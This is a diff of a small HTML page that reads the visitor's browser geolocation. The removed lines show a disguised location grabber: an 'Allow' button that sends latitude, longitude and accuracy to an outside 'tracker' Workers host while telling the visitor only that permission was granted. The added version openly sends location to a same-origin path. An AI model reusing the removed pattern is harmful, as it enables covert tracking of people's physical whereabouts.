@@ -1,48 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Location Permission</title>
+  <title>Safe Geolocation Tracker</title>
 </head>
 <body>
+  <h1>Geolocation Tracker</h1>
+  <button id="locBtn">Send My Location</button>
 
-<h2>Allow Location Access</h2>
-<button onclick="getLocation()">Allow</button>
-
-<p id="status"></p>
-
-<script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/";
-
-function getLocation() {
-  if (!navigator.geolocation) {
-    document.getElementById("status").innerText = "Geolocation not supported.";
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-
-      // send numeric fields to match Worker
-      fetch(WORKER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lat, lon, acc })
-      }).then(() => {
-        document.getElementById("status").innerText = "Permission granted.";
-      }).catch(() => {
-        document.getElementById("status").innerText = "Error sending location.";
-      });
-    },
-    () => {
-      document.getElementById("status").innerText = "Permission denied.";
-    }
-  );
-}
-</script>
-
+  <script>
+    document.getElementById("locBtn").addEventListener("click", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          fetch("/track", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              time: new Date().toISOString()
+            })
+          });
+        }, () => alert("Permission denied or unavailable."));
+      } else {
+        alert("Geolocation not supported by your browser.");
+      }
+    });
+  </script>
 </body>
 </html>
